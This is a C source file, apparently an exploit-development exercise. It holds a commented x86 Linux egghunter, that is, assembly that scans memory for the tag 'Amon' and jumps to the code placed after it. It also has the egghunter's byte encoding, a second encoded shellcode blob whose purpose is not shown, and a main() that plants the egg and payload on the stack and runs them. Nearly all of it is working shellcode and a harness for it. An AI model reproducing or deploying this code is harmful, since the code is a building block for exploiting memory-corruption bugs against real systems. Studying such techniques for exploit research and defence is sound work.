/*

[+] Egghunter
global _start

section .text
_start:
	cld
	xor ecx, ecx
	xor edx, edx

inc_page:
	or dx, 0xfff

inc_one:
	inc edx

check:
	lea ebx, [edx+0x4]
	push byte 0x21
	pop eax
	int 0x80
	cmp al, 0xf2
	jz inc_page

is_egg:
	mov eax, 0x416d6f6e ; Amon
	mov edi, edx
	scasd
	jnz inc_one
	scasd
	jnz inc_one
	jmp edi
*/
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

unsigned char egghunter[] = \
"\xfc\x31\xc9\x31\xd2\x66\x81\xca\xff\x0f"
"\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c"
"\xf2\x74\xee\xb8"
"\x6e\x6f\x6d\x41" // Amon
"\x89\xd7\xaf"
"\x75\xe9\xaf\x75\xe6\xff\xe7";

unsigned char shellcode[] = \
"\xba\xd9\xae\x6c\xa2\xda\xd8\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
"\x0b\x31\x50\x15\x03\x50\x15\x83\xc0\x04\xe2\x2c\xc4\x67\xfa"
"\x57\x4b\x1e\x92\x4a\x0f\x57\x85\xfc\xe0\x14\x22\xfc\x96\xf5"
"\xd0\x95\x08\x83\xf6\x37\x3d\x9b\xf8\xb7\xbd\xb3\x9a\xde\xd3"
"\xe4\x29\x48\x2c\xac\x9e\x01\xcd\x9f\xa1";

void main(void){
	int egghunterLenght = strlen(egghunter);
	int shellcodeLenght = strlen(shellcode);
	char memory[shellcodeLenght + 50];

	printf("Egg hunter shellcode Length: %d\n", strlen(egghunter));
	printf("Shellcode Length:  %d\n", strlen(shellcode));
	
	strcpy(memory, "\x6e\x6f\x6d\x41\x6e\x6f\x6d\x41");  // egg
	strcpy(memory + 8 , shellcode);                      // put shellcode in stack

	int (*ret)() = (int(*)())egghunter;
	ret();
}

